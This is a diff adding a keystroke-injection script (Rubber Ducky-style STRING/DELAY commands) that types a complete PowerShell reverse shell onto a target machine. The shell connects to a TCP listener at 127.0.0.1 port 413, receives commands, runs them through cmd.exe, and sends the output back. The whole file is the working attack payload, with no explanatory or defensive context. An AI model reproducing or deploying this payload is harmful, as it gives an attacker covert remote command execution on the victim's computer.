@@ -1,0 +1,251 @@
+STRING $socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
+SHIFT ENTER
+DELAY 300
+
+STRING if($socket -eq $null)
+DELAY 300
+
+CTRL ALT b
+DELAY 300
+STRING exit 1
+CTRL ALT n
+SHIFT ENTER
+DELAY 300
+
+STRING $stream = $socket.GetStream();
+SHIFT ENTER
+DELAY 300
+
+STRING $writer = new-object System.IO.StreamWriter($stream);
+SHIFT ENTER
+DELAY 300
+
+STRING $buffer = new-object System.Byte[] 1024;
+SHIFT ENTER
+DELAY 300
+
+STRING $encoding = new-object System.Text.AsciiEncoding;
+SHIFT ENTER
+DELAY 300
+
+
+
+STRING do
+SHIFT ENTER
+DELAY 300
+
+CTRL ALT b
+SHIFT ENTER
+
+STRING         $writer.Flush();
+SHIFT ENTER
+DELAY 300
+
+STRING         $read = $null;
+SHIFT ENTER
+DELAY 300
+
+STRING         $res = ""
+SHIFT ENTER
+DELAY 300
+
+STRING         while($stream.DataAvailable -or $read -eq $null)
+CTRL ALT b
+SHIFT ENTER
+DELAY 300
+
+STRING                 $read = $stream.Read($buffer, 0, 1024)
+SHIFT ENTER
+CTRL ALT n
+DELAY 300
+SHIFT ENTER
+
+STRING         $out = $encoding.GetString($buffer, 0, $read).Replace("
+CTRL ALT 7
+DELAY 300
+
+STRING r
+CTRL ALT 7
+DELAY 300
+
+STRING n","").Replace("
+CTRL ALT 7
+DELAY 300
+
+STRING n","");
+SHIFT ENTER
+DELAY 300
+
+STRING         if(!$out.equals("exit"))
+CTRL ALT b
+SHIFT ENTER
+DELAY 300
+
+STRING                 $args = "";
+SHIFT ENTER
+DELAY 300
+
+STRING                 if($out.IndexOf(' ') -gt -1)
+CTRL ALT b
+SHIFT ENTER
+DELAY 300
+
+STRING                         $args = $out.substring($out.IndexOf(' ')+1);
+SHIFT ENTER
+DELAY 300
+
+STRING                         $out = $out.substring(0,$out.IndexOf(' '));
+SHIFT ENTER
+DELAY 300
+
+STRING                         if($args.split(' ').length -gt 1)
+CTRL ALT b
+SHIFT ENTER
+DELAY 300
+
+STRING                 $pinfo = New-Object System.Diagnostics.ProcessStartInfo
+SHIFT ENTER
+DELAY 300
+
+STRING                 $pinfo.FileName = "cmd.exe"
+SHIFT ENTER
+DELAY 300
+
+STRING                 $pinfo.RedirectStandardError = $true
+SHIFT ENTER
+DELAY 300
+
+STRING                 $pinfo.RedirectStandardOutput = $true
+SHIFT ENTER
+DELAY 300
+
+STRING                 $pinfo.UseShellExecute = $false
+SHIFT ENTER
+DELAY 300
+
+STRING                 $pinfo.Arguments = "/c $out $args"
+SHIFT ENTER
+DELAY 300
+
+STRING                 $p = New-Object System.Diagnostics.Process
+SHIFT ENTER
+DELAY 300
+
+STRING                 $p.StartInfo = $pinfo
+SHIFT ENTER
+DELAY 300
+
+STRING                 $p.Start() 
+CTRL ALT w
+DELAY 300
+
+STRING  Out-Null
+SHIFT ENTER
+DELAY 300
+
+STRING                 $p.WaitForExit()
+SHIFT ENTER
+DELAY 300
+
+STRING                 $stdout = $p.StandardOutput.ReadToEnd()
+SHIFT ENTER
+DELAY 300
+
+STRING                 $stderr = $p.StandardError.ReadToEnd()
+SHIFT ENTER
+DELAY 300
+
+STRING                 if ($p.ExitCode -ne 0)
+CTRL ALT b
+SHIFT ENTER
+DELAY 300
+
+STRING                         $res = $stderr
+SHIFT ENTER
+DELAY 300
+
+STRING         
+CTRL ALT n
+STRING else 
+CTRL ALT b
+SHIFT ENTER
+DELAY 300
+
+STRING                         $res = $stdout
+SHIFT ENTER
+DELAY 300
+
+STRING                 
+CTRL ALT n
+SHIFT ENTER
+DELAY 300
+
+STRING                 
+CTRL ALT n
+STRING else
+CTRL ALT b
+SHIFT ENTER
+DELAY 300
+
+STRING                                         $res = (&"$out" "$args") 
+CTRL ALT w
+DELAY 300
+
+STRING  out-string;
+SHIFT ENTER
+DELAY 300
+
+STRING                 
+CTRL ALT n
+SHIFT ENTER
+DELAY 300
+
+CTRL ALT n
+SHIFT ENTER
+DELAY 300
+
+STRING                 else
+CTRL ALT b
+SHIFT ENTER
+DELAY 300
+
+STRING                         $res = (&"$out") 
+CTRL ALT w
+DELAY 300
+
+STRING  out-string;
+SHIFT ENTER
+DELAY 300
+
+CTRL ALT n
+SHIFT ENTER
+DELAY 300
+
+STRING                 if($res -ne $null)
+CTRL ALT b
+SHIFT ENTER
+DELAY 300
+
+STRING         $writer.WriteLine($res)
+SHIFT ENTER
+DELAY 300
+
+CTRL ALT n
+SHIFT ENTER
+DELAY 300
+
+CTRL ALT n
+STRING While (!$out.equals("exit"))
+SHIFT ENTER
+DELAY 300
+
+STRING $writer.close();
+SHIFT ENTER
+DELAY 300
+
+STRING $socket.close();
+SHIFT ENTER
+DELAY 300
+
+STRING $stream.Dispose()
+ENTER
